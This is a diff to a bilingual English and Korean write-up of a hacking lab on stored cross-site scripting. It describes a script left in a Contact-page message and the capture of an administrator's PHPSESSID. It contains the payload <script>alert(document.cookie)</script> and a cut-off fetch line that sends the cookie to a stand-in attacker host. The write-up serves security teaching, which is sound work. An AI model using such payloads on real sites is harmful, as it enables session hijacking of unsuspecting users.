@@ -94,9 +94,11 @@ or by leaving an ID or a specific identifier as proof for bug bounty or verifica
 <br>
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/9.png)<br>
+<br>
 
+Stored Cross-Site Scripting (XSS) refers to an attack where malicious scripts are persistently stored in the web server’s database and subsequently executed in users’ browsers.<br>
 
-저장형 XSS(Stroed XSS)로 
+저장형 XSS(Stroed XSS)로 악성 스크립트가 웹 서버 데이터베이스(DB)에 영구적으로 저장되어 발생하는 공격입니다.
 <br>
 <br>
 <br>
@@ -108,7 +110,8 @@ or by leaving an ID or a specific identifier as proof for bug bounty or verifica
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/8.png)<br>
 
-
+When an IP address is entered into the address bar, the web server is accessed.<br>
+IP를 주소창에 입력하면 웹 서버가 나옵니다. 
 <br>
 <br>
 <br>
@@ -118,20 +121,11 @@ or by leaving an ID or a specific identifier as proof for bug bounty or verifica
 <br>
 
 
-![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/10.png)<br>
-
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-
+![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/.10.png)<br>
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/11.png)<br>
 
+By navigating to the Contact page, a message containing a malicious script, <script>alert(document.cookie)</script>, is left to extract cookie values.<br>
+Contact로 이동해 <script>alert(document.cookie)</script> 쿠키값을 추출하는 악성 스크립트로 메시지를 남깁니다. 
 <br>
 <br>
 <br>
@@ -143,7 +137,8 @@ or by leaving an ID or a specific identifier as proof for bug bounty or verifica
 
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/12.png)<br>
-
+Subsequently, the administrator logs in.<br>
+이후 관리자가 로그인합니다.
 <br>
 <br>
 <br>
@@ -154,7 +149,8 @@ or by leaving an ID or a specific identifier as proof for bug bounty or verifica
 
 ![image 1](/Pictur/Hacking%20lab/owasp/injection/xss/13.png)<br>
 
-
+관리자가 로그인 하면 PHPSESSID가 나오는데, 공격자가 요구한 쿠키값으로 관리자 로그인 증명서와 같습니다.
+공격자가 fetch('http://www.hacker.com/steal?cookie
 <br>
 <br>
 <br>
